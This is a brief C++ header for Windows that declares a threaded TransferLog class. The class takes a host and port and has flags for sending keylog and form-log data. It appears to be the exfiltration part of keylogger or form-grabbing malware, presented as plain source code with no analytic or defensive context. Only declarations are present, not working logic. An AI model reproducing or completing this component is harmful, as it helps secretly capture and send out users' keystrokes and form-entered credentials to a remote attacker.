#pragma once

#include <windows.h>
#include "thread.h"
#include "socketwrapper.h"
#include "config.h"
#include "file.h"

#define TRANSFER_KEYLOG 1
#define TRANSFER_FORMLOG 2

class TransferLog : public Thread
{
public:
	TransferLog(UINT Flags, PCHAR Host, USHORT Port);
	~TransferLog();

private:
	VOID ThreadFunc(VOID);

	UINT Flags;
	PCHAR Host;
	USHORT Port;
};